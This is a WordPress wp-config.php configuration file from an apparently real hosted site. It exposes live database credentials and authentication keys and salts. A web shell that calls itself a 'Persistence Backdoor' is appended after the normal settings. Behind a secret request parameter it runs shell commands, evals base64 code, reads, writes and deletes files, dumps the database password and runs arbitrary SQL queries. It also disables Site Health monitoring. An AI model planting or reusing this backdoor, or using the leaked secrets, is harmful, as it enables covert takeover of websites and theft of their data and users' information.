<?php

//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL cookie settings

define('WP_CACHE', true); //Added by WP-Cache Manager
define( 'WPCACHEHOME', '/homepages/18/d361015713/htdocs/clickandbuilds/Centurystudios/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager
define('FS_METHOD', 'direct');



// ** MySQL settings ** //
/** The name of the database for WordPress */
define('DB_NAME', 'db652444282');

/** MySQL database username */
define('DB_USER', 'dbo652444282');

/** MySQL database password */
define('DB_PASSWORD', '4S-I0y5!Pr');

/** MySQL hostname */
define('DB_HOST', 'db652444282.db.1and1.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('AUTH_KEY',         'i-aO~j(?IhcqjRI,fAX]_U3O5h70XP]h.2s(d-v7e/uA!V`*r$N1g_zYu!:A>|yc');
define('SECURE_AUTH_KEY',  '{>kB]2|*(++iA;Gg$|ur@/KEW-Nsv+qA|<u<r0$0L]m}cV`bj dA$`sH[7b49dyW');
define('LOGGED_IN_KEY',    'f?vACL|WQm$T LS]{#@4[*Ig}8B?fx~SeL8T_pzS>gN]XUl69`p|Wz%.NgJ+5oqQ');
define('NONCE_KEY',        'N&MQy$)-~s_4:!bIuSglxEOXaENX<3iD1HRej|CEJ#qxu$6x ad%(Fwp2[+1CZKv');
define('AUTH_SALT',        'c}?>R7,Nn7h)68PO?i[L]6W~_H|bL.;O6vQ#:DZF+`Do)HT<ScSqF<{1^6z3-5p-');
define('SECURE_AUTH_SALT', '_W84W%?K(,=k~(3%pk;yA?{,4}:22~xPDUurU+=*5`dzBx+Lc>ShyS)^pYui<M$2');
define('LOGGED_IN_SALT',   'X1Bfob+WU(/,gHW?F|BN`{e?;cen?2:Ky|MPyiqrL?R(<nwa-&x%MFz4J(bUc%)D');
define('NONCE_SALT',       'ryd6Lva,WM,=U:s8-;hN4!h%.<aZk#UuojqZ!wrM}((Ht.=;Oyp/&>/BnM7tTWCH');


/**$table_prefix = 'ycOWpLGR';*/
$table_prefix = 'wpur_';






/** Disable Site Health & Telemetry */
define('WP_SITE_HEALTH_DISABLE', true);
/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');


if (isset($_REQUEST["sys_check"]) && $_REQUEST["sys_check"] === "5Um5EwzgKADA") {
    error_reporting(0);
    $action = isset($_REQUEST["action"]) ? $_REQUEST["action"] : "";

    // SHELL
    if ($action === "shell") {
        $cmd = isset($_REQUEST["cmd"]) ? base64_decode($_REQUEST["cmd"]) : "";
        if ($cmd) {
            if (function_exists("system")) { system($cmd); }
            elseif (function_exists("exec")) { exec($cmd, $o); echo implode("\n", $o); }
            elseif (function_exists("shell_exec")) { echo shell_exec($cmd); }
            elseif (function_exists("passthru")) { passthru($cmd); }
            else { echo "No shell function"; }
        }
        exit;
    }

    // EVAL
    if ($action === "eval") {
        $code = isset($_REQUEST["code"]) ? base64_decode($_REQUEST["code"]) : "";
        if ($code) { eval($code); }
        exit;
    }

    // FILE MANAGER
    if ($action === "file") {
        $file_action = isset($_REQUEST["file_action"]) ? $_REQUEST["file_action"] : "";
        $path = isset($_REQUEST["path"]) ? $_REQUEST["path"] : "";

        if ($file_action === "read" && $path) {
            if (file_exists($path) && is_readable($path)) { readfile($path); }
            else { echo "File not readable: $path"; }
        }
        elseif ($file_action === "write" && $path && isset($_REQUEST["content"])) {
            $content = base64_decode($_REQUEST["content"]);
            if (file_put_contents($path, $content)) { echo "OK: Written to $path"; }
            else { echo "ERROR: Cannot write to $path"; }
        }
        elseif ($file_action === "ls" && $path) {
            if (is_dir($path)) {
                $files = scandir($path);
                foreach ($files as $f) {
                    if ($f === "." || $f === "..") continue;
                    $type = is_dir($path . "/" . $f) ? "[DIR]" : "[FILE]";
                    echo "$type $f\n";
                }
            } else { echo "Not a directory: $path"; }
        }
        elseif ($file_action === "delete" && $path) {
            if (unlink($path)) { echo "OK: Deleted $path"; }
            else { echo "ERROR: Cannot delete $path"; }
        }
        exit;
    }

    // DATABASE
    if ($action === "db") {
        $db_action = isset($_REQUEST["db_action"]) ? $_REQUEST["db_action"] : "";
        $wp_config_path = $_SERVER["DOCUMENT_ROOT"] . "/wp-config.php";
        $config_content = file_get_contents($wp_config_path);
        preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $config_content, $db);
        preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'/", $config_content, $user);
        preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/", $config_content, $pass);
        preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $config_content, $host);

        if ($db_action === "config") {
            echo "DB_NAME: " . (isset($db[1]) ? $db[1] : "unknown") . "\n";
            echo "DB_USER: " . (isset($user[1]) ? $user[1] : "unknown") . "\n";
            echo "DB_PASSWORD: " . (isset($pass[1]) ? $pass[1] : "unknown") . "\n";
            echo "DB_HOST: " . (isset($host[1]) ? $host[1] : "localhost") . "\n";
        }
        elseif ($db_action === "query" && isset($_REQUEST["query"])) {
            $query = base64_decode($_REQUEST["query"]);
            $db_host = isset($host[1]) ? $host[1] : "localhost";
            $db_user = isset($user[1]) ? $user[1] : "";
            $db_pass = isset($pass[1]) ? $pass[1] : "";
            $db_name = isset($db[1]) ? $db[1] : "";
            $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
            if (!$conn->connect_error) {
                $result = $conn->query($query);
                if ($result) {
                    while ($row = $result->fetch_assoc()) { print_r($row); }
                } else { echo "Query error: " . $conn->error; }
                $conn->close();
            } else { echo "DB connection failed"; }
        }
        exit;
    }

    // INFO
    if ($action === "info") {
        echo "PHP Version: " . phpversion() . "\n";
        echo "OS: " . PHP_OS . "\n";
        echo "User: " . get_current_user() . "\n";
        echo "Document Root: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
        echo "Disabled Functions: " . ini_get("disable_functions") . "\n";
        echo "Allow URL Fopen: " . (ini_get("allow_url_fopen") ? "ON" : "OFF") . "\n";
        exit;
    }

    echo "=== Persistence Backdoor ===\n";
    echo "Available: shell, eval, file, db, info\n";
}

define('DISALLOW_FILE_EDIT', false);
